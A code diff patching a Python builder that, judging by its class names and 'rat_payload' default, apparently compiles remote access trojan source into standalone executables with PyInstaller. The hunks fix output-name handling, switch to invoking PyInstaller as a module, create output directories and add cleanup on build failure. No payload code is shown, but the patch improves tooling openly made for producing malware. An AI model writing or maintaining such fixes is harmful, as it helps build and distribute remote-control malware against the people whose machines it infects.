@@ -144,6 +144,10 @@ class RATExecutableBuilder:
     
     def __init__(self, rat_source, output_name="rat_payload", config=None):
         self.rat_source = rat_source
+        # Extract just the filename without directory and extension
+        output_name = os.path.basename(output_name)
+        if output_name.endswith('.exe'):
+            output_name = output_name[:-4]
         self.output_name = output_name
         self.config = config or {}
         self.work_dir = tempfile.mkdtemp(prefix="rat_build_")
@@ -258,12 +262,11 @@ if __name__ == "__main__":
         """Build executable with PyInstaller"""
         self.log("info", "Building executable with PyInstaller...")
         
-        # Find pyinstaller executable
-        import shutil
-        pyinstaller_path = shutil.which('pyinstaller') or sys.executable.replace('python', 'pyinstaller')
-        
+        # Use PyInstaller as a module (more reliable than finding executable)
         cmd = [
-            pyinstaller_path,
+            sys.executable,
+            '-m',
+            'PyInstaller',
             '-F',
             '-n', self.output_name,
             '--distpath=./dist',
@@ -358,6 +361,7 @@ if __name__ == "__main__":
                 self.log("success", f"{'='*80}\n")
                 return True
         
+        self.cleanup()
         return False
     
     def cleanup(self):
@@ -426,12 +430,22 @@ def main():
         print(Style.error(f"✗ Source file not found: {args.source}"))
         return False
     
+    # Create output directory if needed
+    output_dir = os.path.dirname(args.output) or '.'
+    if output_dir and not os.path.exists(output_dir):
+        os.makedirs(output_dir, exist_ok=True)
+    
+    # Extract just the filename without extension
+    output_name = os.path.basename(args.output)
+    if output_name.endswith('.exe'):
+        output_name = output_name[:-4]
+    
     # Select builder
     if args.advanced:
-        builder = AdvancedRATBuilder(args.source, args.output)
+        builder = AdvancedRATBuilder(args.source, output_name)
         success = builder.build_advanced()
     else:
-        builder = RATExecutableBuilder(args.source, args.output)
+        builder = RATExecutableBuilder(args.source, output_name)
         success = builder.build()
     
     # Cleanup
